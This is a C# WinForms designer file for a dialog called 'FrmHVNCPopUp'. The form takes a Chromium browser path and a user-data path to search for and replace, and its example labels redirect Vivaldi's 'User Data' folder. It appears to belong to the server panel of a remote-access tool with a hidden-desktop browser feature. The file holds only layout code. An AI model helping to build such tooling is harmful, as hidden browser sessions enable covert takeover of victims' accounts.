namespace Pulsar.Server.Forms
{
    partial class FrmHVNCPopUp
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            components = new System.ComponentModel.Container();
            lblBrowserPath = new System.Windows.Forms.Label();
            txtBrowserPath = new System.Windows.Forms.TextBox();
            btnBrowse = new System.Windows.Forms.Button();
            lblSearchPattern = new System.Windows.Forms.Label();
            txtSearchPattern = new System.Windows.Forms.TextBox();
            lblReplacementPath = new System.Windows.Forms.Label();
            txtReplacementPath = new System.Windows.Forms.TextBox();
            btnStart = new System.Windows.Forms.Button();
            btnCancel = new System.Windows.Forms.Button();
            groupBox1 = new System.Windows.Forms.GroupBox();
            lblExample3 = new System.Windows.Forms.Label();
            lblExample2 = new System.Windows.Forms.Label();
            lblExample1 = new System.Windows.Forms.Label();
            toolTip1 = new System.Windows.Forms.ToolTip(components);
            lblNote = new System.Windows.Forms.Label();
            groupBox1.SuspendLayout();
            SuspendLayout();
            // 
            // lblBrowserPath
            // 
            lblBrowserPath.AutoSize = true;
            lblBrowserPath.Location = new System.Drawing.Point(14, 17);
            lblBrowserPath.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            lblBrowserPath.Name = "lblBrowserPath";
            lblBrowserPath.Size = new System.Drawing.Size(139, 15);
            lblBrowserPath.TabIndex = 0;
            lblBrowserPath.Text = "Browser Executable Path:";
            // 
            // txtBrowserPath
            // 
            txtBrowserPath.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
            txtBrowserPath.Location = new System.Drawing.Point(18, 36);
            txtBrowserPath.Margin = new System.Windows.Forms.Padding(4, 3, 4, 3);
            txtBrowserPath.Name = "txtBrowserPath";
            txtBrowserPath.Size = new System.Drawing.Size(572, 23);
            txtBrowserPath.TabIndex = 1;
            // 
            // btnBrowse
            // 
            btnBrowse.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
            btnBrowse.Location = new System.Drawing.Point(597, 33);
            btnBrowse.Margin = new System.Windows.Forms.Padding(4, 3, 4, 3);
            btnBrowse.Name = "btnBrowse";
            btnBrowse.Size = new System.Drawing.Size(88, 27);
            btnBrowse.TabIndex = 2;
            btnBrowse.Text = "Browse...";
            btnBrowse.UseVisualStyleBackColor = true;
            btnBrowse.Click += btnBrowse_Click;
            // 
            // lblSearchPattern
            // 
            lblSearchPattern.AutoSize = true;
            lblSearchPattern.Location = new System.Drawing.Point(14, 74);
            lblSearchPattern.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            lblSearchPattern.Name = "lblSearchPattern";
            lblSearchPattern.Size = new System.Drawing.Size(113, 15);
            lblSearchPattern.TabIndex = 3;
            lblSearchPattern.Text = "String to Search For:";
            // 
            // txtSearchPattern
            // 
            txtSearchPattern.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
            txtSearchPattern.Location = new System.Drawing.Point(18, 92);
            txtSearchPattern.Margin = new System.Windows.Forms.Padding(4, 3, 4, 3);
            txtSearchPattern.Name = "txtSearchPattern";
            txtSearchPattern.Size = new System.Drawing.Size(667, 23);
            txtSearchPattern.TabIndex = 4;
            // 
            // lblReplacementPath
            // 
            lblReplacementPath.AutoSize = true;
            lblReplacementPath.Location = new System.Drawing.Point(14, 130);
            lblReplacementPath.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            lblReplacementPath.Name = "lblReplacementPath";
            lblReplacementPath.Size = new System.Drawing.Size(127, 15);
            lblReplacementPath.TabIndex = 5;
            lblReplacementPath.Text = "String to Replace With:";
            // 
            // txtReplacementPath
            // 
            txtReplacementPath.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
            txtReplacementPath.Location = new System.Drawing.Point(18, 149);
            txtReplacementPath.Margin = new System.Windows.Forms.Padding(4, 3, 4, 3);
            txtReplacementPath.Name = "txtReplacementPath";
            txtReplacementPath.Size = new System.Drawing.Size(667, 23);
            txtReplacementPath.TabIndex = 6;
            // 
            // btnStart
            // 
            btnStart.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
            btnStart.Location = new System.Drawing.Point(503, 353);
            btnStart.Margin = new System.Windows.Forms.Padding(4, 3, 4, 3);
            btnStart.Name = "btnStart";
            btnStart.Size = new System.Drawing.Size(88, 35);
            btnStart.TabIndex = 7;
            btnStart.Text = "Start";
            btnStart.UseVisualStyleBackColor = true;
            btnStart.Click += btnStart_Click;
            // 
            // btnCancel
            // 
            btnCancel.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
            btnCancel.Location = new System.Drawing.Point(597, 353);
            btnCancel.Margin = new System.Windows.Forms.Padding(4, 3, 4, 3);
            btnCancel.Name = "btnCancel";
            btnCancel.Size = new System.Drawing.Size(88, 35);
            btnCancel.TabIndex = 8;
            btnCancel.Text = "Cancel";
            btnCancel.UseVisualStyleBackColor = true;
            btnCancel.Click += btnCancel_Click;
            // 
            // groupBox1
            // 
            groupBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
            groupBox1.Controls.Add(lblNote);
            groupBox1.Controls.Add(lblExample3);
            groupBox1.Controls.Add(lblExample2);
            groupBox1.Controls.Add(lblExample1);
            groupBox1.ForeColor = System.Drawing.SystemColors.Control;
            groupBox1.Location = new System.Drawing.Point(18, 190);
            groupBox1.Margin = new System.Windows.Forms.Padding(4, 3, 4, 3);
            groupBox1.Name = "groupBox1";
            groupBox1.Padding = new System.Windows.Forms.Padding(4, 3, 4, 3);
            groupBox1.Size = new System.Drawing.Size(667, 156);
            groupBox1.TabIndex = 9;
            groupBox1.TabStop = false;
            groupBox1.Text = "Examples";
            // 
            // lblExample3
            // 
            lblExample3.AutoSize = true;
            lblExample3.ForeColor = System.Drawing.SystemColors.ControlLight;
            lblExample3.Location = new System.Drawing.Point(12, 87);
            lblExample3.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            lblExample3.Name = "lblExample3";
            lblExample3.Size = new System.Drawing.Size(214, 15);
            lblExample3.TabIndex = 2;
            lblExample3.Text = "Replacement Path:  Local\\Vivaldi\\KDOT";
            // 
            // lblExample2
            // 
            lblExample2.AutoSize = true;
            lblExample2.ForeColor = System.Drawing.SystemColors.ControlLight;
            lblExample2.Location = new System.Drawing.Point(12, 58);
            lblExample2.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            lblExample2.Name = "lblExample2";
            lblExample2.Size = new System.Drawing.Size(215, 15);
            lblExample2.TabIndex = 1;
            lblExample2.Text = "Search Pattern:  Local\\Vivaldi\\User Data";
            // 
            // lblExample1
            // 
            lblExample1.AutoSize = true;
            lblExample1.ForeColor = System.Drawing.SystemColors.ControlLight;
            lblExample1.Location = new System.Drawing.Point(12, 29);
            lblExample1.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            lblExample1.Name = "lblExample1";
            lblExample1.Size = new System.Drawing.Size(339, 15);
            lblExample1.TabIndex = 0;
            lblExample1.Text = "Browser Path:  C:\\Program Files\\Vivaldi\\Application\\vivaldi.exe";
            // 
            // lblNote
            // 
            lblNote.AutoSize = true;
            lblNote.ForeColor = System.Drawing.SystemColors.ControlLight;
            lblNote.Location = new System.Drawing.Point(13, 111);
            lblNote.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            lblNote.Name = "lblNote";
            lblNote.Size = new System.Drawing.Size(231, 15);
            lblNote.TabIndex = 3;
            lblNote.Text = "Note: Do NOT put quotes around anything";
            // 
            // FrmHVNCPopUp
            // 
            AutoScaleDimensions = new System.Drawing.SizeF(7F, 15F);
            AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            ClientSize = new System.Drawing.Size(699, 402);
            Controls.Add(groupBox1);
            Controls.Add(btnCancel);
            Controls.Add(btnStart);
            Controls.Add(txtReplacementPath);
            Controls.Add(lblReplacementPath);
            Controls.Add(txtSearchPattern);
            Controls.Add(lblSearchPattern);
            Controls.Add(btnBrowse);
            Controls.Add(txtBrowserPath);
            Controls.Add(lblBrowserPath);
            Margin = new System.Windows.Forms.Padding(4, 3, 4, 3);
            MinimumSize = new System.Drawing.Size(715, 441);
            Name = "FrmHVNCPopUp";
            StartPosition = System.Windows.Forms.FormStartPosition.CenterParent;
            Text = "Generic Chromium Browser Configuration";
            Load += FrmHVNCPopUp_Load;
            groupBox1.ResumeLayout(false);
            groupBox1.PerformLayout();
            ResumeLayout(false);
            PerformLayout();

        }

        #endregion

        private System.Windows.Forms.Label lblBrowserPath;
        private System.Windows.Forms.TextBox txtBrowserPath;
        private System.Windows.Forms.Button btnBrowse;
        private System.Windows.Forms.Label lblSearchPattern;
        private System.Windows.Forms.TextBox txtSearchPattern;
        private System.Windows.Forms.Label lblReplacementPath;
        private System.Windows.Forms.TextBox txtReplacementPath;
        private System.Windows.Forms.Button btnStart;
        private System.Windows.Forms.Button btnCancel;
        private System.Windows.Forms.GroupBox groupBox1;
        private System.Windows.Forms.Label lblExample3;
        private System.Windows.Forms.Label lblExample2;
        private System.Windows.Forms.Label lblExample1;
        private System.Windows.Forms.ToolTip toolTip1;
        private System.Windows.Forms.Label lblNote;
    }
}